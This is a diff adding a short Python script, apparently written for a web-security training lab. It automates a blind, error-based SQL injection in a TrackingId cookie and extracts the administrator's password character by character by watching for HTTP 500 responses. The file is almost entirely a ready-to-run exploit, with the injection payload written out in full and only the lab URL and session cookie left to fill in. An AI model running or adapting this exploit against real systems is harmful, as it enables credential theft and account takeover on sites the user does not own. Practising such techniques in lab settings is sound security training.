@@ -1,0 +1,51 @@
+#!/usr/bin/env python3
+
+from pwn import *
+import requests
+import time
+import signal
+import sys
+import string
+
+
+def def_handler(sig, frame):
+    
+	print(f"\n\n[!] Saliendo...")
+	sys.exit(1)
+	
+# Control+C 
+
+signal.signal(signal.SIGINT, def_handler)
+
+
+def makesqli():
+
+	p1 = log.progress("SQLi")
+	p1.status("Iniciando Fuerza bruta")
+
+	url = "{Your-Lab-URL}"
+	characters = string.ascii_lowercase + string.digits
+
+	password = ''
+	p2 = log.progress(f'Contraseña: ')
+	sleep(0.5)
+	for i in range(1,21):
+
+		for character in characters: 
+			cookies = {
+				'TrackingId': "qnCfeMPd6zIbZXJ9'|| (select case when (substr(password,%d,1)='%c') then to_char(1/0) else NULL end from users where username='administrator')||'" % (i, character),
+				'session': '{Your_Session_Cookie}'
+			}
+
+			p1.status(cookies['TrackingId'])		
+			r = requests.get(url, cookies=cookies)
+			#print(r.status_code)
+			if r.status_code == 500:
+				password += character
+				p2.status(password)
+				break
+
+	print(password)
+if __name__== '__main__':
+
+	makesqli()
